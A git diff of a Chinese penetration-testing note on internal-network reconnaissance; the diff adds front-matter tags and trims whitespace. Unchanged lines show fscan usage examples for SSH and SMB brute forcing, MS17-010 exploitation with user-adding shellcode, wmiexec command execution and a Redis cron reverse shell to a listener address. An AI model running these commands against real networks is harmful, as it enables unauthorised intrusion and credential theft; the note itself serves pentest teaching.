@@ -1,5 +1,12 @@
 ---
-
+category:
+  - 网络安全
+  - 内网渗透
+tags:
+  - 网络安全
+  - 内网渗透
+  - 信息收集
+excerpt: 内网渗透中信息收集的工具用法，包括 fscan 一键化综合扫描的详细参数与使用示例。
 ---
 
 # 内网信息收集
@@ -24,7 +31,7 @@ fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
 fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
 fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
 fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
-fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
+fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)
 fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
 fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
 fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
@@ -117,7 +124,6 @@ fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiex
         在原有密码字典基础上,增加新密码
   -socks5
         指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)
-  -sc 
+  -sc
         指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)
 ```
-
